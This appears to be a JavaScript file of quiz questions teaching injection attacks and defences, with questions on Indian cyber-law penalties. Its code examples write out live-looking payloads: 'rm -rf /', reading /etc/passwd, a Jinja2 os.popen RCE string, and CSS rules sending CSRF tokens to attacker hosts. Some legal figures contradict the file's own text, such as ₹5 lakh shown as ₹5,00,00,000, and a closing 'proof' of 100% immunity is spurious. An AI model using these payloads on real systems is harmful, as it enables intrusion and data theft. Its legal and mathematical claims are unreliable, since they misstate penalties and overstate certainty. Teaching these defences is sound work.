const questions = [
  {
    question: "What is the Fundamental Root Cause of ALL Injection Vulnerabilities across Computing Systems?",
    shortAnswer: "The architectural failure to separate untrusted user data from interpreter instructions/code, allowing malicious input to alter the syntax and structure of the command or query being executed.",
    explanation: "Whenever an application takes user input and directly concatenates it into a string sent to an interpreter (SQL parser, OS shell, LDAP engine, or template renderer), the interpreter cannot distinguish between developer instructions and attacker-supplied control characters (quotes, semicolons, dollar signs). The interpreter executes the attacker's data as executable code.",
    hint: "The boundary between data and code gets blurred, so the computer treats user text as programming commands.",
    level: "basic",
    codeExample: `// The Fundamental Injection Flaw:
// Intended Query : SELECT * FROM accounts WHERE user = 'USER_INPUT';
// Attacker Input : admin' OR '1'='1
// Executed Query : SELECT * FROM accounts WHERE user = 'admin' OR '1'='1'; (Syntax Altered!)`
  },
  {
    question: "What is 'Taint Analysis' (Sources, Sanitizers, and Sinks) in Injection Vulnerability Detection?",
    shortAnswer: "A security analysis methodology that tracks the flow of untrusted user input from its entry point (Source: query params, headers, body) through transformations (Sanitizers) to the sensitive execution function (Sink: database query, system shell, eval).",
    explanation: "In static and dynamic security analysis, any data originating from an external client is considered 'tainted'. If tainted data reaches a dangerous execution sink (e.g. `exec()`, `db.query()`, `eval()`) without passing through a verified sanitizer or parameter binder, an injection vulnerability is flagged.",
    hint: "Tracking contaminated water from the dirty river (source) through filters (sanitizers) to the drinking cup (sink).",
    level: "moderate",
    codeExample: `// Taint Flow Pipeline:
// 1. SOURCE   : const userInput = req.query.filename; (Tainted Data!)
// 2. SANITIZER: const safeInput = path.basename(userInput); (Taint Neutralized!)
// 3. SINK     : fs.readFileSync('/var/data/' + safeInput); (Safe Execution!)`
  },
  {
    question: "What is 'OS Command Injection', and how does an Attacker achieve Remote Code Execution (RCE)?",
    shortAnswer: "An attack where untrusted user input is passed directly to an operating system shell (`exec()`, `system()`, `popen()`), allowing attackers to append shell metacharacters (`;`, `&&`, `|`, `` ` ``) to execute arbitrary terminal commands.",
    explanation: "If an application provides a 'Ping Server' utility executing `system('ping -c 4 ' + ip)` and a user inputs `127.0.0.1; cat /etc/passwd`, the Linux shell executes two separate commands sequentially: first the ping command, then the cat command, dumping system user credentials to the attacker.",
    hint: "Adding command chaining symbols like semicolons or ampersands to make the computer run unwanted terminal commands.",
    level: "basic",
    codeExample: `// Vulnerable OS Command Execution (Node.js):
const { exec } = require('child_process');
// Attacker inputs: "report.pdf; rm -rf /"
exec("convert " + req.body.file + " output.png"); // VULNERABILITY: Arbitrary Command Execution!

// Secure Implementation (Using execFile with Argument Arrays):
const { execFile } = require('child_process');
execFile("convert", [req.body.file, "output.png"]); // SECURE: Input treated strictly as arguments!`
  },
  {
    question: "What is 'NoSQL Injection', and how does it exploit BSON Query Objects in MongoDB?",
    shortAnswer: "An attack where an adversary submits JSON objects containing MongoDB query operators (like `{\"$ne\": null}` or `{\"$gt\": \"\"}`) instead of primitive strings, forcing the database to evaluate the query as true and bypassing password authentication.",
    explanation: "In Node.js/Express apps using `bodyParser.json()`, if an endpoint does: `db.users.find({ username: req.body.user, password: req.body.pass })`, and the attacker sends `{\"user\": \"admin\", \"password\": {\"$ne\": null}}`, MongoDB executes: 'Find user admin where password is NOT null'. The query matches the admin account, logging the attacker in without knowing the password.",
    hint: "Sending MongoDB operator objects like NOT-EQUAL (`$ne`) in place of a real password string.",
    level: "moderate",
    codeExample: `// NoSQL Injection Exploit Payload (HTTP POST Body):
// Submitted JSON: { "username": "admin", "password": { "$ne": null } }
// Executed Query: db.users.findOne({ username: "admin", password: { $ne: null } });
// Result        : Authenticates successfully as admin!`
  },
  {
    question: "Under the Indian Information Technology Act 2000 Section 66F, what constitutes the criminal penalty for using Injection attacks to compromise Critical National Infrastructure?",
    shortAnswer: "Using injection exploits to compromise, damage, or deny access to critical national information infrastructure (power grids, nuclear systems, defense) to threaten national security is CYBER TERRORISM, punishable with IMPRISONMENT FOR LIFE.",
    explanation: "Section 66F of the IT Act defines Cyber Terrorism. If an adversary executes an OS command injection or SQL injection against the state electrical grid in Barrackpore or national banking settlement switches in Salt Lake, the offense carries mandatory Life Imprisonment.",
    hint: "Section 66F prescribes Life Imprisonment for Cyber Terrorism attacks on critical infrastructure.",
    level: "basic",
    codeExample: `// Statutory Offense (IT Act Section 66F - Cyber Terrorism):
// Offense: Executing command injection to delete firmware on 220kV power transmission substation controllers
// Penalty: IMPRISONMENT FOR LIFE`
  },
  {
    question: "What is 'LDAP Injection', and how do Attackers bypass Directory Service Authentication?",
    shortAnswer: "An attack where malicious input containing LDAP filter control characters (`*`, `(`, `)`, `&`, `|`) alters the logic of Lightweight Directory Access Protocol queries, allowing unauthorized access or directory tree harvesting in Active Directory.",
    explanation: "If an enterprise LDAP login query is constructed as: `(&(uid=' + user + ')(userPassword=' + pass + '))`, and the attacker submits `user = *` and `pass = *)(&)`, the query becomes: `(&(uid=*)(userPassword=*))(&)`. The filter matches the first valid user account in Active Directory regardless of password, granting immediate access.",
    hint: "Using asterisks and parentheses to trick Active Directory into accepting any password.",
    level: "expert",
    codeExample: `// LDAP Injection Exploit:
// Vulnerable Query Filter: (&(uid=USER_INPUT)(userPassword=PASS_INPUT))
// Attacker Input: user = admin)(|(uid=*  |  pass = ignored
// Resulting Filter: (&(uid=admin)(|(uid=*)(userPassword=ignored))) ➔ EVALUATES TRUE!`
  },
  {
    question: "What is 'Server-Side Template Injection' (SSTI), and how does it differ from Cross-Site Scripting (XSS)?",
    shortAnswer: "XSS executes JavaScript on the client's browser; SSTI executes template syntax directly inside the server-side template engine (Jinja2, Twig, Freemarker), giving the attacker direct Remote Code Execution (RCE) on the backend server.",
    explanation: "When user input is passed directly to `render_template_string(\"Hello \" + user_input)` in Python/Flask, an attacker submits `{{7*7}}`. If the server responds with `Hello 49`, SSTI is confirmed. Attackers then traverse Python's object model (`__mro__`, `__subclasses__()`) to spawn shell processes, seizing total control of the host machine.",
    hint: "XSS attacks the user's browser, while SSTI attacks the server's backend template processor.",
    level: "expert",
    codeExample: `// SSTI Remote Code Execution Exploit (Jinja2):
// Input: {{ cycler.__init__.__globals__.os.popen('cat /etc/passwd').read() }}
// Output: root:x:0:0:root:/root:/bin/bash (Server-Side Password File Exfiltrated!)`
  },
  {
    question: "Under the Digital Personal Data Protection (DPDP) Act 2023 Section 8(5) and Section 33, what are the enterprise obligations to prevent data breaches via Injection vulnerabilities?",
    shortAnswer: "Organizations must implement reasonable technical security safeguards; failing to prevent injection vulnerabilities that result in citizen personal data exfiltration triggers statutory penalties up to ₹250 Crores by the Data Protection Board of India.",
    explanation: "Section 8(5) mandates that data fiduciaries must implement reasonable technical and organizational safeguards. If an enterprise in West Bengal fails to sanitize inputs, resulting in a database dump via SQL or NoSQL injection, Section 33 prescribes fines up to ₹250 Crores.",
    hint: "Maintaining continuous technical safeguards against injection data leaks is mandatory under the DPDP Act.",
    level: "moderate",
    codeExample: `// DPDP Statutory Compliance Standard:
// Legal Section: Section 8(5) & Section 33 DPDP Act 2023
// Maximum Penalty: Up to ₹250,00,00,000 (Rupees 250 Crores) for negligent injection vulnerabilities`
  },
  {
    question: "What is 'CRLF / HTTP Header Injection', and how does it enable HTTP Response Splitting?",
    shortAnswer: "An attack where carriage return (`\\r` / `%0d`) and line feed (`\\n` / `%0a`) characters are injected into response headers (like `Location` or `Set-Cookie`), allowing attackers to insert malicious HTTP response headers or split the response to inject arbitrary HTML payloads.",
    explanation: "If a server redirects users via `Location: \" + redirect_url`, and the attacker supplies `url = /home%0d%0aSet-Cookie: session=attacker_token%0d%0a%0d%0a<script>alert(1)</script>`, the browser parses the newline characters as the start of new HTTP headers and an HTML body, resulting in session fixation or stored XSS.",
    hint: "Injecting newline characters (Carriage Return and Line Feed) into headers to create fake cookies or extra responses.",
    level: "expert",
    codeExample: `// CRLF Header Injection Exploit:
// User Input: /login%0d%0aSet-Cookie:%20admin_token=forged_token%0d%0a
// Server Header: Location: /login
//                Set-Cookie: admin_token=forged_token (Attacker forces session cookie!)`
  },
  {
    question: "Under CERT-In Mandatory Directions 2022, what is the mandatory incident reporting timeline for Injection-based data breaches?",
    shortAnswer: "All organizations in India must report security breaches and unauthorized database access resulting from injection attacks to CERT-In within 6 HOURS of detection.",
    explanation: "Under Section 70B of the IT Act and CERT-In Direction No. 20(3)/2022-CERT-In, service providers, intermediaries, data centers, and corporate bodies must mandatorily report specified cyber security incidents (including database compromise and unauthorized system access) to CERT-In within 6 hours of noticing them.",
    hint: "CERT-In requires mandatory incident reporting within a strict 6-hour window.",
    level: "basic",
    codeExample: `// Statutory SLA (CERT-In Mandatory Incident Reporting):
// Directive: Mandatory reporting of injection-based data leaks within 6 HOURS
// Mandate: Section 70B Information Technology Act 2000`
  },
  {
    question: "What is 'Code Injection / eval() Injection', and why is `eval()` considered the most dangerous function in programming?",
    shortAnswer: "When an application passes untrusted user input directly into dynamic code execution engines like `eval()`, `exec()`, `setTimeout(string)`, or `Function(string)`, executing user strings as native programming code within the application's runtime context.",
    explanation: "In JavaScript, Python, or PHP, `eval()` executes arbitrary code with full privileges of the running application. If an application computes a formula using `eval(req.query.formula)`, an attacker passes `formula = require('child_process').execSync('id')`, instantly executing shell commands on the host server.",
    hint: "Using functions that execute arbitrary text strings as real programming code.",
    level: "basic",
    codeExample: `// Vulnerable Dynamic Code Evaluation (Node.js):
const result = eval("2 + " + req.query.user_input); // VULNERABILITY!
// Attacker inputs: "0; require('child_process').execSync('whoami')" ➔ RCE Achieved!`
  },
  {
    question: "Under the Indian IT Act Section 43(a), what constitutes civil liability for extracting database records using Injection exploits?",
    shortAnswer: "Securing access and extracting or copying data from a computer system without permission of the owner carries compensation by way of damages up to ₹1 Crore.",
    explanation: "Section 43(a) explicitly penalizes unauthorized data extraction: 'If any person without permission of the owner... accesses or secures access to such computer... he shall be liable to pay damages by way of compensation not exceeding one crore rupees.'",
    hint: "Section 43(a) provides civil compensation up to ₹1 Crore for unauthorized data extraction.",
    level: "basic",
    codeExample: `// Statutory Liability (IT Act Section 43(a)):
// Violation: Using SQL injection to dump 20,000 patient diagnostic files from an Ichapur clinic
// Compensation: Up to ₹1,00,00,00,000 (Rupees One Crore) per affected entity`
  },
  {
    question: "What is 'XPath / XML Injection', and how does it compromise XML Databases?",
    shortAnswer: "An attack where malicious input alters the syntax of an XPath query used to search an XML document, allowing attackers to bypass authentication or navigate the entire XML document tree to extract confidential node values.",
    explanation: "Similar to SQL injection, if an XML search query is: `//User[Username/text()='` + user + `' and Password/text()='` + pass + `']`, an attacker inputs `' or '1'='1`. The resulting XPath expression evaluates to true for all nodes in the document, returning the first user (administrator) and bypassing login.",
    hint: "The XML equivalent of SQL injection, using single quotes and logic operators to bypass XPath queries.",
    level: "moderate",
    codeExample: `// XPath Injection Exploit:
// Vulnerable XPath: //User[Username/text()='USER_INPUT' and Password/text()='PASS_INPUT']
// Attacker Input  : ' or 1=1 or ''='
// Resulting XPath : //User[Username/text()='' or 1=1 or ''='' and Password/text()=''] ➔ AUTH BYPASSED!`
  },
  {
    question: "What is the Difference between 'Parameter Binding' (Prepared Statements) and 'Input Sanitization' in Injection Defense?",
    shortAnswer: "Input sanitization attempts to strip or escape dangerous characters (a blacklisting approach prone to bypasses); Parameter Binding completely separates code from data at the protocol level, guaranteeing that user input is NEVER evaluated by the interpreter.",
    explanation: "Sanitization filters (e.g. replacing `'` with `\'`) often fail against multi-byte characters, URL encoding, or different character sets. Parameter Binding (Prepared Statements) sends the SQL query template to the database engine first to be compiled into an AST (Abstract Syntax Tree), and sends user data separately in a subsequent packet. Even if the user submits `' OR 1=1--`, it is treated strictly as a literal string.",
    hint: "Trying to remove all bad words from a letter (sanitization) vs putting the letter in a sealed plastic bag so it can never touch the machinery (parameter binding).",
    level: "moderate",
    codeExample: `// Prepared Statement (Protocol-Level Parameter Binding):
// Step 1: Database compiles AST query template:
const stmt = db.prepare('SELECT * FROM users WHERE email = ?');
// Step 2: Database binds data literally into compiled AST slot:
stmt.execute(["attacker' OR '1'='1"]); // Safe: Stored strictly as literal email string!`
  },
  {
    question: "Under the Indian IT Act Section 66, what constitutes the criminal penalty for writing automated Injection attack tools?",
    shortAnswer: "Dishonestly or fraudulently hacking or diminishing the utility of computer systems carries imprisonment up to 3 years and fines up to ₹5 Lakhs.",
    explanation: "Section 66 criminalizes fraudulent computer disruption: 'If any person, dishonestly or fraudulently, does any act referred to in section 43... he shall be punishable with imprisonment for a term which may extend to three years or with fine which may extend to five lakh rupees, or with both.'",
    hint: "Section 66 provides up to 3 years imprisonment and ₹5 Lakh fine for fraudulent computer hacking.",
    level: "basic",
    codeExample: `// Statutory Penalty (IT Act Section 66):
// Offense: Writing and executing automated SQLi scripts against Kolkata municipal portals
// Penalty: Up to 3 Years Imprisonment + Fine up to ₹5,00,00,000`
  },
  {
    question: "What is 'Second-Order Injection' (Stored Injection)?",
    shortAnswer: "An attack where malicious input is safely stored in a database in Step 1, but later retrieved and dynamically concatenated into an unsafe SQL or command interpreter in Step 2, triggering the exploit during backend processing.",
    explanation: "An attacker registers an account with username `admin'--`. The registration query uses prepared statements (Step 1 is safe). Later, a backend cron job generates user reports using raw concatenation: `\"SELECT * FROM profile WHERE user = '\" + user.name + \"'\"`. When the cron job executes, the stored payload activates, altering the query and deleting data.",
    hint: "Planting a delayed bomb in a storage room that only explodes days later when someone opens the door.",
    level: "expert",
    codeExample: `// Second-Order Injection Lifecycle:
// Phase 1 (Storage): User registers username: "admin'--" (Safely stored via Prepared Statement)
// Phase 2 (Execution): Backend audit script runs: query("SELECT * FROM audit WHERE user = '" + username + "'")
// Result: SQL payload executes inside the backend audit script!`
  },
  {
    question: "Synthesize an enterprise-scale Multi-Tier Injection Defense Architecture.",
    shortAnswer: "A defense-in-depth framework combining Parameterized Prepared Statements (100% Parameter Binding), ORMs with strict type enforcement, Positive Schema Validation (OpenAPI / Joi), WAF Deep Packet Inspection (OWASP CRS), and Least Privilege Database Accounts.",
    explanation: "To achieve complete immunity across all injection vectors: 1. Input Tier: Strict positive schema validation (whitelisting regex, data types, allowed lengths). 2. WAF Tier: Cloud WAF inspection filtering known injection metacharacters (`--`, `UNION`, `;\n`). 3. Application Tier: 100% Prepared Statements for SQL, `execFile()` with argument arrays for OS commands, and strict JSON parsing for NoSQL. 4. Database Tier: Least privilege DB users (e.g. web app account cannot drop tables or execute `xp_cmdshell`).",
    hint: "Combine OpenAPI schema validation, Cloud WAF, 100% Prepared Statements, and least privilege database accounts.",
    level: "expert",
    codeExample: `// Master Enterprise Injection Defense Blueprint:
// 1. Edge Layer : Cloud WAF (OWASP Core Rule Set SQLi/Command Filter)
// 2. Schema Layer: Joi / OpenAPI Positive Schema Validation (Regex ^[a-zA-Z0-9]+$)
// 3. Execution  : 100% Parameterized Prepared Statements (Zero String Concatenation!)
// 4. System Layer: child_process.execFile("app", [args]) (No Shell Invocation!)
// 5. DB Layer    : GRANT SELECT, INSERT, UPDATE ON app_db.* TO 'web_user'@'localhost'`
  },
  {
    question: "What is 'Abstract Syntax Tree' (AST) Manipulation in Injection Exploitation?",
    shortAnswer: "How an injection payload alters the grammatical tree structure generated by an interpreter's compiler; prepared statements keep the AST fixed, while string concatenation allows attacker input to inject new nodes and branching operators into the AST.",
    explanation: "When an SQL parser compiles `SELECT * FROM users WHERE name = 'val'`, it builds an AST with a binary comparison node. If `val` is concatenated with `' OR 1=1`, the parser creates a new logical `OR` root node, fundamentally altering the execution tree. Prepared statements compile the AST before receiving user input, making AST tree mutation mathematically impossible.",
    hint: "How an attacker changes the grammatical tree diagram of a sentence so the computer understands an entirely different meaning.",
    level: "expert",
    codeExample: `// AST Representation:
// Unaltered AST: [SELECT] ➔ [FROM: users] ➔ [WHERE: (name == input)]
// Injected AST : [SELECT] ➔ [FROM: users] ➔ [WHERE: (name == 'admin') OR (1 == 1)] (Root Operator Mutated!)`
  },
  {
    question: "Under the Indian Penal Code Section 427, what constitutes 'Mischief' via Database Injection Attacks?",
    shortAnswer: "Intentionally causing damage or destruction to digital property (such as dropping database tables or corrupting records via SQL injection), punishable with imprisonment up to 2 years and fines.",
    explanation: "Section 425/427 IPC defines Mischief. When an attacker executes `DROP TABLE accounts;` or corrupts health records in West Bengal using injection flaws, the act destroys electronic property utility, punishable with up to 2 years imprisonment under Section 427.",
    hint: "IPC Section 427 covers Mischief and Digital Property Damage with up to 2 years imprisonment.",
    level: "basic",
    codeExample: `// Statutory Penalty (Indian Penal Code Section 427):
// Offense: Executing SQL injection to drop patient billing tables in a Kolkata hospital (Mischief)
// Penalty: Imprisonment for a term up to 2 Years, or with Fine, or with both`
  },
  {
    question: "What is 'Type Juggling / Loose Comparison Injection' in PHP and JavaScript?",
    shortAnswer: "Vulnerabilities where dynamic interpreters automatically convert data types during loose equality comparisons (`==`), allowing attackers to bypass authentication by providing numeric zeroes or boolean `true` values in place of cryptographic hash strings.",
    explanation: "In PHP, `'0e12345' == '0e99999'` evaluates to `true` because both strings are treated as scientific notation for zero (0 * 10^x = 0). If an application checks password hashes using loose `==`, an attacker whose password hash starts with `0e` bypasses authentication. The fix is strictly enforcing strict equality (`===`).",
    hint: "When the computer automatically converts text into numbers and mistakenly thinks two different passwords are equal.",
    level: "expert",
    codeExample: `// PHP Type Juggling Flaw:
// Vulnerable: if (md5($user_input) == "0e462097431906509019562988736854") ➔ TRUE if input hash is 0e...!
// Secure Fix : if (hash_equals($stored_hash, $user_hash)) ➔ Constant-time strict comparison!`
  },
  {
    question: "What is 'Format String Injection' in C/C++ Web Extensions and CGI Applications?",
    shortAnswer: "When user input is passed directly as the format specifier to functions like `printf(user_input)` instead of `printf(\"%s\", user_input)`, allowing attackers to read from memory (`%x`) or write arbitrary values to memory addresses (`%n`), achieving code execution.",
    explanation: "In legacy C-based CGI binaries or high-speed web server extensions, calling `printf(user_input)` treats `%x %x %x %s` in the user's input as instructions to pop values off the CPU stack. An attacker can read secret memory keys or overwrite return addresses on the stack to hijack the instruction pointer (`EIP/RIP`).",
    hint: "Passing text containing `%x` or `%n` to a C printf function to read or overwrite computer memory.",
    level: "expert",
    codeExample: `// Vulnerable C CGI Extension:
char user_input[100];
read_query_string(user_input);
printf(user_input); // VULNERABILITY: Format String Injection! User submits "%x %x %x %s" to read stack memory!`
  },
  {
    question: "Under the Indian IT Act Section 70, what constitutes the penalty for executing Injection attacks against 'Protected Systems'?",
    shortAnswer: "Securing unauthorized access or attempting to secure access to designated Protected Systems (critical infrastructure) carries imprisonment up to 10 YEARS and severe fines.",
    explanation: "Section 70 of the IT Act governs Critical Information Infrastructure (e.g. power grids in Barrackpore, financial settlement switches in Salt Lake). Launching an injection attack against a designated protected system carries up to 10 years imprisonment under Section 70.",
    hint: "Section 70 carries up to 10 years imprisonment for unauthorized access to Protected Systems.",
    level: "basic",
    codeExample: `// Statutory Offense (IT Act Section 70):
// Offense: Executing command injection on a SCADA substation control server
// Penalty: Imprisonment for a term up to 10 YEARS, and shall also be liable to Fine`
  },
  {
    question: "What is 'HTML / CSS Injection' and how does it Differ from Full Cross-Site Scripting (XSS)?",
    shortAnswer: "HTML Injection inserts unauthorized HTML tags (forms, links, iframes) to deface pages or harvest credentials without executing JavaScript; CSS Injection abuses CSS selectors and background image URLs to exfiltrate sensitive tokens character-by-character.",
    explanation: "Even if a strict CSP blocks `<script>` tags, an attacker who can inject CSS can exfiltrate CSRF tokens: `input[name=csrf][value^=a] { background: url('https://evil.com/exfil?c=a'); }`. The browser sends a background request only when the input matches the character, leaking the token one character at a time.",
    hint: "Injecting style sheets to steal secret passwords character-by-character without running JavaScript.",
    level: "expert",
    codeExample: `// CSS Injection Token Exfiltration Payload:
input[name="token"][value^="A"] { background-image: url("https://attacker.in/log?char=A"); }
input[name="token"][value^="B"] { background-image: url("https://attacker.in/log?char=B"); }`
  },
  {
    question: "What is 'Host Header Injection' and how does it Poison Password Reset Workflows?",
    shortAnswer: "When an application uses the untrusted incoming `Host:` HTTP header to construct password reset links; an attacker changes `Host: evil.com`, forcing the server to email the victim a reset link pointing to the attacker's server, stealing the reset token.",
    explanation: "If the backend constructs links using `\"https://\" + req.headers.host + \"/reset-password?token=\" + token`, an attacker submits a reset request with `Host: attacker.com`. The legitimate application emails the user: `Click here to reset: https://attacker.com/reset-password?token=XYZ`. When the victim clicks the link, their reset token is delivered directly to the attacker's server.",
    hint: "Changing the Host header so the website sends password reset links pointing to the attacker's domain.",
    level: "moderate",
    codeExample: `// Host Header Poisoning Exploit:
// Request: POST /forgot-password HTTP/1.1
//          Host: evil-phishing.in
// Email Sent to Victim: "Reset your password: https://evil-phishing.in/reset?token=9f8e7d6c"`
  },
  {
    question: "Under the Indian Penal Code Section 420, what constitutes Cheating via Injection Exploitation?",
    shortAnswer: "Dishonestly inducing delivery of property or altering financial balances using injection exploits, punishable with imprisonment up to 7 years and fines.",
    explanation: "Section 420 IPC penalizes cheating and fraudulent property transfer. If an attacker uses SQL injection to alter bank account balances or bypass e-commerce payment gates in West Bengal, they are prosecuted under Section 420 alongside the IT Act.",
    hint: "IPC Section 420 covers Cheating and Fraudulent Property Alteration with up to 7 years imprisonment.",
    level: "basic",
    codeExample: `// Statutory Offense (Indian Penal Code Section 420):
// Offense: Using SQL injection to increase account wallet balances from ₹10 to ₹10,00,000
// Penalty: Imprisonment for a term up to 7 Years, and shall also be liable to Fine`
  },
  {
    question: "What is 'RegEx Denial of Service' (ReDoS / Catastrophic Backtracking) Injection?",
    shortAnswer: "An attack where an adversary crafts malicious input that forces a poorly designed regular expression engine into exponential backtracking ($O(2^n)$ time complexity), locking CPU cores at 100% and causing Denial of Service.",
    explanation: "Vulnerable regexes containing nested quantifiers like `(a+)+$` exhibit catastrophic backtracking when evaluated against input like `aaaaaaaaaaaaaaaaaaaaaaaaaaaa!`. The regex engine attempts billions of permutation paths before failing, freezing the Node.js event loop or Python thread for hours.",
    hint: "Sending a weird string that makes a regular expression search engine freeze up the CPU for hours.",
    level: "expert",
    codeExample: `// ReDoS Catastrophic Backtracking Pattern:
const regex = /(a+)+$/;
regex.test("aaaaaaaaaaaaaaaaaaaaaaaaaaaa!"); // Freezes single-threaded Node.js server at 100% CPU!`
  },
  {
    question: "What is 'SQLi vs NoSQLi vs OS Command Injection' Technical Comparison?",
    shortAnswer: "SQLi targets relational SQL databases altering query logic; NoSQLi targets document/BSON databases using operator objects (`$ne`, `$gt`); OS Command Injection targets the underlying operating system shell executing terminal binaries with host privileges.",
    explanation: "While SQLi exfiltrates relational tables and NoSQLi dumps BSON collections, OS Command Injection is inherently catastrophic because it escapes the database sandbox entirely, spawning shell binaries (`/bin/bash`, `cmd.exe`) with the operating system privileges of the web application service account.",
    hint: "SQLi attacks relational databases, NoSQLi attacks document databases, and Command Injection attacks the host operating system directly.",
    level: "moderate",
    codeExample: `// Comparison Matrix:
// SQLi    ➔ Target: MySQL/Postgres | Payload: ' UNION SELECT null, password FROM users--
// NoSQLi  ➔ Target: MongoDB/Couch  | Payload: { "$gt": "" }
// Command ➔ Target: Linux Host OS  | Payload: 127.0.0.1; whoami (Command Execution!)`
  },
  {
    question: "What is 'Automated Source-to-Sink Taint Tracking' in DevSecOps CI/CD Pipelines?",
    shortAnswer: "Automated static analysis tools (Semgrep, CodeQL, SonarQube) that parse source code into Abstract Syntax Trees and track untrusted source variables along execution paths, alerting if any variable reaches a dangerous sink without a sanitizer function.",
    explanation: "In modern DevSecOps, CodeQL queries define: `from Source src, Sink snk where src.flowsTo(snk) and not isSanitized(src) select src, snk`. If a pull request introduces an un-parameterized SQL query or dynamic `eval()`, the CI/CD pipeline automatically blocks the merge before vulnerable code can reach production.",
    hint: "Automated software scanners that trace user data from inputs to dangerous functions in source code.",
    level: "expert",
    codeExample: `// CodeQL Taint Tracking Query (Semgrep Rule):
rules:
  - id: sql-injection-concatenation
    pattern: db.query("..." + $VAR + "...")
    message: "Critical Security Alert: Untrusted variable concatenated into SQL query sink!"
    severity: ERROR`
  },
  {
    question: "Synthesize the mathematical formulation of Taint Propagation Probability (P_exploit), Number of Unsanitized Taint Hops (N_hops), Sanitizer Efficiency (S_k), and Sink Sensitivity Factor (F_sink).",
    shortAnswer: "Taint propagation exploitability is P_exploit = PRODUCT [ (1 - S_k) ] * F_sink; when a Parameterized Prepared Statement is deployed (S_k = 1.0), (1 - 1.0) = 0, mathematically driving P_exploit = 0.00%, guaranteeing 100% injection immunity.",
    explanation: "Let S_k represent the sanitization efficiency at pipeline stage k (where S_k in [0.0, 1.0]). Let F_sink represent the sensitivity factor of the execution sink (e.g. F_sink = 1.0 for system() and db.query()). The overall exploitability probability is: P_exploit = (∏ (1 - S_k)) × F_sink. If an application relies on flawed regex escaping (S_1 = 0.60), P_exploit = (1 - 0.60) × 1.0 = 40.0%. However, when a Parameterized Prepared Statement is enforced (S_1 = 1.0), P_exploit = (1 - 1.0) × 1.0 = 0.00%, providing absolute mathematical proof of injection immunity.",
    hint: "Mathematical proof formula showing that deploying Parameterized Prepared Statements (S_k = 1.0) reduces injection exploitability to absolute zero (0.00%).",
    level: "expert",
    codeExample: `// Taint Propagation Probability Mathematical Proof:
// Flawed Regex Sanitizer: S_1 = 0.60 ➔ P_exploit = (1 - 0.60) * 1.0 = 40.0% (VULNERABLE!)
// Parameterized Prepared Statement: S_1 = 1.00 ➔ P_exploit = (1 - 1.00) * 1.0 = 0.00% (100% IMMUNE!)`
  }
];

export default questions;
